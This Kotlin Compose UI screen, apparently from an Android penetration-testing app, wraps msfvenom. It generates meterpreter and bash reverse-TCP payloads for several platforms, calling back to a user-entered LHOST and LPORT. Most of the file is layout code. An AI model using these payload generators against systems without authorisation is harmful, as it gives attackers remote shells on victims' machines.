package dev.reforge.ui.screens

import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.LazyRow
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Memory
import androidx.compose.material.icons.filled.Stop
import androidx.compose.material.icons.outlined.DeleteOutline
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import androidx.compose.material3.TextField
import androidx.compose.material3.TextFieldDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.viewmodel.compose.viewModel
import dev.reforge.ui.theme.Accent
import dev.reforge.ui.theme.MutedDark
import dev.reforge.ui.theme.SurfaceDark2

private data class Payload(val name: String, val payload: String, val format: String?, val ext: String)

private val payloads = listOf(
    Payload("Android", "android/meterpreter/reverse_tcp", null, "apk"),
    Payload("Linux x64", "linux/x64/meterpreter/reverse_tcp", "elf", "elf"),
    Payload("Windows x64", "windows/x64/meterpreter/reverse_tcp", "exe", "exe"),
    Payload("PHP", "php/meterpreter/reverse_tcp", "raw", "php"),
    Payload("Python", "python/meterpreter/reverse_tcp", "raw", "py"),
    Payload("Bash", "cmd/unix/reverse_bash", "raw", "sh"),
)

private val PBg = Color(0xFF0B0E14)
private val PPrompt = Color(0xFF43D08A)
private val POut = Color(0xFFAEB9C9)
private val PCmd = Color(0xFFE6ECF5)

@Composable
fun PayloadScreen(onBack: () -> Unit, vm: RunnerViewModel = viewModel()) {
    var selected by remember { mutableIntStateOf(0) }
    var lhost by remember { mutableStateOf("") }
    var lport by remember { mutableStateOf("4444") }
    val p = payloads[selected]
    val outPath = "/root/reforge-payloads/reverse-${p.name.lowercase().replace(" ", "")}.${p.ext}"
    // Command built by the Rust core (skyla_core) so preview and run can't drift.
    val preview = uniffi.skyla_core.msfvenomCmd(p.payload, lhost, lport, p.format, outPath)
    val listState = rememberLazyListState()

    LaunchedEffect(vm.lines.size, vm.lines.lastOrNull()?.text?.length) {
        if (vm.lines.isNotEmpty()) listState.animateScrollToItem(vm.lines.size - 1)
    }

    Column(Modifier.fillMaxSize()) {
        Row(
            Modifier.fillMaxWidth().padding(start = 4.dp, end = 8.dp, top = 10.dp, bottom = 4.dp),
            verticalAlignment = Alignment.CenterVertically,
        ) {
            IconButton(onClick = onBack) {
                Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
            }
            Text("Payloads", style = MaterialTheme.typography.titleLarge, modifier = Modifier.weight(1f))
            IconButton(onClick = { vm.clear() }) {
                Icon(Icons.Outlined.DeleteOutline, contentDescription = "Clear", tint = MutedDark)
            }
        }

        Column(Modifier.padding(horizontal = 12.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
            LazyRow(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                items(payloads) { pl ->
                    val idx = payloads.indexOf(pl)
                    val sel = idx == selected
                    Text(
                        pl.name,
                        style = MaterialTheme.typography.bodyMedium,
                        color = if (sel) Color(0xFF0B0E13) else Accent,
                        modifier = Modifier.clip(RoundedCornerShape(50))
                            .let { if (sel) it.background(Accent) else it.border(1.dp, Accent, RoundedCornerShape(50)) }
                            .clickable(enabled = !vm.busy) { selected = idx }
                            .padding(horizontal = 14.dp, vertical = 8.dp),
                    )
                }
            }
            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                TextField(
                    value = lhost, onValueChange = { lhost = it },
                    modifier = Modifier.weight(1.6f), enabled = !vm.busy, singleLine = true,
                    placeholder = { Text("LHOST") },
                    textStyle = TextStyle(fontFamily = FontFamily.Monospace, fontSize = 14.sp),
                    colors = pColors(),
                )
                TextField(
                    value = lport, onValueChange = { lport = it.filter { c -> c.isDigit() } },
                    modifier = Modifier.weight(1f), enabled = !vm.busy, singleLine = true,
                    placeholder = { Text("LPORT") },
                    textStyle = TextStyle(fontFamily = FontFamily.Monospace, fontSize = 14.sp),
                    colors = pColors(),
                )
            }
            Box(
                Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(PBg)
                    .horizontalScroll(rememberScrollState()).padding(10.dp),
            ) {
                Text(preview, fontFamily = FontFamily.Monospace, fontSize = 11.sp, color = PPrompt)
            }
        }

        LazyColumn(
            state = listState,
            modifier = Modifier.weight(1f).fillMaxWidth().padding(horizontal = 12.dp, vertical = 8.dp)
                .clip(RoundedCornerShape(10.dp)).background(PBg),
            contentPadding = androidx.compose.foundation.layout.PaddingValues(12.dp),
            verticalArrangement = Arrangement.spacedBy(2.dp),
        ) {
            if (vm.lines.isEmpty()) {
                item {
                    Text(
                        "Set LHOST/LPORT and generate. msfvenom boot takes ~10–20s.",
                        color = Color(0xFF5A6677), fontFamily = FontFamily.Monospace, fontSize = 12.sp,
                    )
                }
            }
            items(vm.lines, key = { it.id }) { line -> PLine(line) }
        }

        Row(Modifier.fillMaxWidth().padding(start = 12.dp, end = 12.dp, top = 2.dp, bottom = 14.dp)) {
            if (vm.busy) {
                Button(
                    onClick = { vm.stop() }, modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3A2130), contentColor = Color(0xFFE88B8B)),
                ) { Icon(Icons.Filled.Stop, contentDescription = null, modifier = Modifier.size(20.dp)); Text("  Stop") }
            } else {
                Button(
                    onClick = {
                        val cmd = "mkdir -p /root/reforge-payloads && " +
                            uniffi.skyla_core.msfvenomCmd(p.payload, lhost.trim(), lport, p.format, outPath) +
                            " && echo && echo SAVED: $outPath && ls -la $outPath"
                        vm.run(cmd)
                    },
                    enabled = lhost.isNotBlank() && lport.isNotBlank(),
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = Accent, contentColor = Color(0xFF0B0E13)),
                ) { Icon(Icons.Filled.Memory, contentDescription = null, modifier = Modifier.size(20.dp)); Text("  Generate ${p.ext.uppercase()}") }
            }
        }
    }
}

@Composable
private fun pColors() = TextFieldDefaults.colors(
    focusedContainerColor = SurfaceDark2,
    unfocusedContainerColor = SurfaceDark2,
    focusedIndicatorColor = Color.Transparent,
    unfocusedIndicatorColor = Color.Transparent,
    cursorColor = Accent,
)

@Composable
private fun PLine(line: TermLine) {
    when (line.kind) {
        TermKind.COMMAND -> Row(Modifier.fillMaxWidth().padding(top = 2.dp)) {
            Text("❯ ", color = PPrompt, fontFamily = FontFamily.Monospace, fontSize = 13.sp)
            Box(Modifier.horizontalScroll(rememberScrollState())) {
                Text(line.text, color = PCmd, fontFamily = FontFamily.Monospace, fontSize = 12.sp)
            }
        }
        TermKind.OUTPUT -> Box(Modifier.fillMaxWidth().horizontalScroll(rememberScrollState())) {
            Text(line.text, color = POut, fontFamily = FontFamily.Monospace, fontSize = 12.sp, lineHeight = 16.sp)
        }
        TermKind.INFO -> Text(line.text, color = Color(0xFF5A6677), fontFamily = FontFamily.Monospace, fontSize = 12.sp)
    }
}
